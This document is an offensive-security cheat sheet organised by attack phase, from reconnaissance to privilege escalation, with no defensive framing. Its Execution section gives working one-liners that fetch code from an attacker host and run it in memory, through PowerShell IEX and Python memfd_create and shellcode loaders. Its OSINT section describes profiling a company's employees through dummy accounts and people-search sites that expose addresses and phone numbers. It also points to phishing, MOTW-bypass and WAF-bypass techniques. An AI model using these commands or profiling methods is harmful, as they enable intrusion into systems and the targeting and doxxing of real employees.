# Offensive Security Notes: Unredacted  
**Be advised: hot takes ahead. These are the things people don’t say out loud.**

- [OSINT](#osint)  
- [External Recon](#external-recon)  
- [Initial Access](#initial-access)  
- [Execution](#execution)  
- [Command & Control](#command--control)  
- [Credential Access](#credential-access)  
- [Lateral Movement](#lateral-movement)  
- [Privilege Escalation](#privilege-escalation)  

---

## OSINT

<table>
  <tr><td>LinkedIn</td><td>Can Filter by company and it shows employees, also even shows people based on type of degree (allows you to profile targets) - Can use VPN and dummy account</td></tr>
  <tr><td>Employee Collection</td><td>Most companies use gmail and outlook. Also most employee emails are first.lastname@domain.com,firstname@domain.com, or <lastname><first_initial><second_initial>@domain.com. Even if you get preferred names from LinkedIn you can use sites like TruePeopleSearch to get full names, phone numbers, and addresses. You can also use IDCrawl to find social media accounts.</td></tr>
  <tr><td>Targeting</td><td>Can build a mind map on individuals, including prioritization of targeting. I’ll figure out how to word what I want here. Most of it doesn't apply to "red team" since there is no real hacking. It apply to actual technqiues to exploit individuals.</td></tr>
</table>

---

## External Recon

<table>
  <tr>
    <td><b>LinkedIn</b></td>
    <td>
      <pre><code>sudo ngrep -i -d &lt;network interface&gt; 's.?a.?m.?b.?a.*[[:digit:]]' port 139
smbclient -U '%' -N -L \\\\10.10.10.10\\</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>Using Shodan to Retrieve Open Ports and Info</b></td>
    <td>
      <pre><code>nmap -sn -Pn -n --script=shodan-api --script-args 'shodan-api.apikey=XXXXXX' worldsworstwebsiteever.com</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>Firewall Evasion</b></td>
    <td>
      <a href="https://github.com/kritikakatyal/Firewall-Evasion-Techniques-Analysis" target="_blank">Firewall Evasion Techniques</a>
    </td>
  </tr>
</table>


## Initial Access

<table>
    <tr>
    <td>Phishing/Smishing</td>
    <td>
      <a href="https://medium.com/sud0root/mastering-modern-red-teaming-infrastructure-part-7-advanced-phishing-techniques-for-2fa-bypass-85f9adc4dc3b" target="_blank">Medium: Advanced Phishing Techniques for 2FA Bypass</a>,  
      <a href="https://posts.specterops.io/phish-sticks-hate-the-smell-love-the-taste-f4db9de888f7" target="_blank">SpecterOps: Phish Sticks</a>
      Most companies don't give all employess second phones, but have them use their personal phone.  
    </td>
    </tr>
  <tr><td>MOTW bypass</td><td>tar.gz, CVE-2025-31334 - WinRar, CVE-2025-0411 - 7-zip</td></tr>
  <tr>
    <td>Excel</td>
    <td>
      <a href="https://github.com/mttaggart/xllrs" target="_blank"> Microsoft blocks macros in documents originating from the internet (email AND web download), XLL (Excel Add-Ins) are dlls loaded by Excel. Still get warning for no signature. Need legitimate code signing certificate to avoid this.</a>
    </td>
    </tr>
    <tr>
    <td>Supply Chain</td>
    <td>
      <a href="https://github.com/0x-Apollyon/Malicious-VScode-Extension" target="_blank">Dracula VS Code plugin was trojanized previously</a>
    </td>
    </tr>
    <tr>
    <td>WAF</td>
    <td>
      <a href="https://github.com/botesjuan/Obfuscating-Techniques-WAF-Bypass" target="_blank">Obfuscation Tricks</a>, 
      <a href="https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/" target="_blank">Path Confusion</a>, 
      <a href="https://medium.com/@honze_net/vulnhub-minu-1-write-up-8032fdda5939" target="_blank">URL Encoding</a>
    </td>
    </tr>
  <tr>
    <td>Routers</td>
    <td>
      Will fill in, but popping these is how nation-states get in.
    </td>
    </tr>
</table>

---

## Execution

<table>
  <tr>
    <td><b>PowerUp in Memory (CMD)</b></td>
    <td>
      <pre><code>echo IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/PowerUp.ps1') | powershell -noprofile -</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>PowerUp in Memory (PowerShell)</b></td>
    <td>
      <pre><code>wget('http://10.10.10.10/PowerUp.ps1') -UseBasicParsing | iex</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>Python3 ELF In-Memory (No Params)</b></td>
    <td>
      <pre><code>python3.7 -c 'import os, urllib.request; d=urllib.request.urlopen("http://10.10.0.103/test.exe"); fd=os.memfd_create("foo"); os.write(fd,d.read()); p=f"/proc/self/fd/{fd}"; os.execve(p, [p], {})'</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>Python3 ELF In-Memory (With Params)</b></td>
    <td>
      <pre><code>python3 -c 'import os; import urllib.request; d = urllib.request.urlopen("https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap?raw=true"); fd = os.memfd_create("foo"); os.write(fd, d.read()); p = f"/proc/self/fd/{fd}"; os.execve(p, [p,"-Pn", "-n", "127.0.0.1"], {})'</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>Python2 Shellcode Execution</b></td>
    <td>
      <pre><code>/usr/bin/python -c 'import urllib2,mmap,ctypes;d=urllib2.urlopen("http://10.10.10.10/a").read();m=mmap.mmap(-1,len(d),34,7);m.write(d);ctypes.CFUNCTYPE(None)(ctypes.addressof(ctypes.c_char.from_buffer(m)))()'</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>Python2 Temp ELF Execution</b></td>
    <td>
      <pre><code>/usr/bin/python -c 'import os,urllib2,tempfile;d=urllib2.urlopen("http://10.10.10.10/config").read();f=tempfile.NamedTemporaryFile(delete=False);f.write(d);f.close();os.chmod(f.name,0755);os.execve(f.name,[f.name,"-pthread"],{})'</code></pre>
    </td>
  </tr>
</table>


## Command & Control

<table>
  <tr><td><b>Subcategory</b></td><td><b>Description / Notes</b></td></tr>
  <tr><td>Beacon Profiles</td><td>Low-and-slow configs, jitter tuning, domain fronting tricks</td></tr>
  <tr><td>Frameworks & Custom Tooling</td><td>Cobalt Strike, Sliver, custom implants, OPSEC-safe builds</td></tr>
  <tr><td>Infrastructure Setup</td><td>Redirectors, staging servers, domain blending, TLS fingerprinting</td></tr>
</table>

---

## Credential Access

<table>
  <tr><td><b>Subcategory</b></td><td><b>Description / Notes</b></td></tr>
  <tr><td>Password Dumping</td><td>LSASS scraping, memory inspection, offline SAM parsing</td></tr>
  <tr><td>Token Theft / Abuse</td><td>Impersonation, delegation tokens, S4U abuse, golden tickets</td></tr>
  <tr><td>MFA / SSO Bypass</td><td>Push fatigue, token replay, OAuth abuse, conditional access gaps</td></tr>
</table>

---

## Lateral Movement

<table>
  <tr><td><b>Subcategory</b></td><td><b>Description / Notes</b></td></tr>
  <tr><td>Remote Execution</td><td>WMI, PSRemoting, scheduled tasks, service creation</td></tr>
  <tr><td>Credential Reuse</td><td>Pass-the-Hash, Pass-the-Ticket, Kerberoasting, plaintext creds</td></tr>
  <tr><td>AD / Identity Abuse</td><td>ACL abuse, shadow admin paths, group membership manipulation</td></tr>
</table>

---

## Privilege Escalation

<table>
  <tr><td><b>Subcategory</b></td><td><b>Description / Notes</b></td></tr>
  <tr><td>Local Exploits</td><td>Kernel bugs, DLL hijacking, vulnerable drivers, CVE chaining</td></tr>
  <tr><td>Misconfigurations</td><td>Unquoted service paths, writable directories, insecure permissions</td></tr>
  <tr><td>Token / Role Abuse</td><td>Privileged token impersonation, cloud role escalation, SID history tricks</td></tr>
</table>
